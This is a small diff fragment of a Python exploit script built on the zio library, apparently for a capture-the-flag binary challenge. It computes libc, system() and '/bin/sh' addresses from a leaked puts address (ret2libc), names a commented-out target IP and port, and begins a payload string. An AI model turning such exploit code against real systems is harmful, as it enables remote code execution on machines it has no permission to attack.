@@ -37,7 +37,6 @@ BINSH_LIBC = 0x00160A24
 
 
 # TARGET = ('10.211.55.32', 8888)
-0x080488F0
 
 io = zio.zio(TARGET)
 io.read_until_timeout()
@@ -53,8 +52,6 @@ print hex(puts_addr)
 libc_addr = puts_addr - PUTS_LIBC
 system_addr = libc_addr + SYSTEM_LIBC
 binsh_addr = libc_addr + BINSH_LIBC
-
-
 
 io.read_until_timeout()
 payload = 'http://%\x001'
